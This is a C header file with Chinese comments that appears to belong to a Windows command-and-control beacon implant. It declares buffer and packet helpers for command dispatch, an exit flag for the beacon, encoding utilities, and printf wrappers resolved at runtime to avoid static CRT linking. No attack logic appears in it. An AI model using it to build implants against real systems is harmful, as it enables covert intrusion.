#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <stddef.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

/* 字节类型 */
typedef unsigned char BYTE8;

/* 动态字节缓冲区 */
typedef struct ByteBuf {
    BYTE8* data;                /* 数据指针 */
    SIZE_T len;                 /* 当前有效长度 */
    SIZE_T cap;                 /* 已分配容量 */
} ByteBuf;

/* 数据包列表（用于命令分发返回多个包） */
typedef struct PacketList {
    ByteBuf* items;             /* 数据包数组 */
    SIZE_T count;               /* 当前数量 */
    SIZE_T cap;                 /* 数组容量 */
    INT items_are_final;        /* 是否为最终数据包 */
    INT should_exit;            /* 是否要求 beacon 退出 */
} PacketList;

/* ===== ByteBuf 操作 ===== */

VOID BbInit(ByteBuf* b);                               /* 初始化缓冲区 */
VOID BbFree(ByteBuf* b);                               /* 释放缓冲区 */
INT BbReserve(ByteBuf* b, SIZE_T need);                /* 确保至少 need 字节可用空间 */
INT BbAppend(ByteBuf* b, const VOID* data, SIZE_T len);/* 追加原始字节 */
INT BbU8(ByteBuf* b, UINT8 v);                         /* 追加 uint8 */
INT BbU16(ByteBuf* b, UINT16 v);                       /* 追加 uint16（大端序） */
INT BbU32(ByteBuf* b, UINT32 v);                       /* 追加 uint32（大端序） */
INT BbU64(ByteBuf* b, UINT64 v);                       /* 追加 uint64（大端序） */
INT BbBytes(ByteBuf* b, const VOID* data, SIZE_T len); /* 追加长度前缀字节块 */
INT BbString(ByteBuf* b, const CHAR* s);               /* 追加长度前缀字符串 */
INT BbPrintf(ByteBuf* b, const CHAR* fmt, ...);        /* 格式化追加 */
ByteBuf BbFromText(const CHAR* s);                     /* 从文本创建缓冲区 */

/* ===== PacketList 操作 ===== */

VOID PlistInit(PacketList* list);                      /* 初始化列表 */
VOID PlistFree(PacketList* list);                      /* 释放列表 */
INT PlistAdd(PacketList* list, ByteBuf item);          /* 添加数据包 */

/* ===== 字符串与编码工具 ===== */

WCHAR* Utf8ToWide(const CHAR* s);                      /* UTF-8 → Wide（HeapAlloc） */
CHAR* WideToUtf8(const WCHAR* s);                      /* Wide → UTF-8（HeapAlloc） */
CHAR* SystemToUtf8(const CHAR* data, UINT cp);         /* 指定代码页 → UTF-8 */
CHAR* SystemBytesToUtf8(const BYTE8* data, SIZE_T len, UINT cp); /* 字节数据代码页 → UTF-8 */
CHAR* HeapStrDupA(const CHAR* s);                      /* ANSI 字符串复制（HeapAlloc） */
WCHAR* HeapStrDupW(const WCHAR* s);                    /* Wide 字符串复制（HeapAlloc） */
VOID HexEncode(const BYTE8* data, SIZE_T len, CHAR* out, SIZE_T out_len); /* 字节 → hex 字符串 */
UINT64 GetUnixTimestamp(VOID);                         /* 获取 Unix 时间戳（秒） */
VOID DebugPrintf(const CHAR* fmt, ...);                /* 调试输出（OutputDebugStringA） */

/* 动态解析的格式化接口（避免静态链接 CRT printf） */
INT FmtVscprintfA(const CHAR* fmt, va_list ap);
INT FmtVsnprintfA(CHAR* dst, SIZE_T dst_len, const CHAR* fmt, va_list ap);
INT FmtSnprintfA(CHAR* dst, SIZE_T dst_len, const CHAR* fmt, ...);
INT FmtSnprintfW(WCHAR* dst, SIZE_T dst_len, const WCHAR* fmt, ...);

/* 宏重定向：项目中的 snprintf/vsnprintf/_vscprintf/swprintf_s 自动走动态解析 */
#ifndef BEACON_NO_FORMAT_REDIRECT
#define snprintf   FmtSnprintfA
#define vsnprintf  FmtVsnprintfA
#define _vscprintf FmtVscprintfA
#define swprintf_s FmtSnprintfW
#endif
